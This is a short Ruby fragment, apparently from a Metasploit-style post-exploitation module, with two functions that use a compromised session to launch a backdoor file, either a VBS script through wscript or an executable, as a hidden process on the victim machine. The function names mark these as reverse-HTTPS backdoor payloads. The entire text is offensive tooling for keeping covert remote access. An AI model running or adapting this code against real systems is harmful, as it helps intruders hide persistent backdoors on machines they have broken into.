def vbs_reverse_https path_to_backdoor, session
    print_status "wscript ..."
    session.sys.process.execute("cmd.exe /c wscript #{path_to_backdoor}", nil, {'Hidden' => 'true'})
end

def exe_reverse_https path_to_backdoor, session
    print_status "executing ..."
    session.sys.process.execute("#{path_to_backdoor}", nil, {'Hidden' => 'true'})
   
end
